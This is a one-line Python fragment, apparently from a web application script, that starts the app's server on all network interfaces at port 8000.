    app.run(host='0.0.0.0', port=8000)
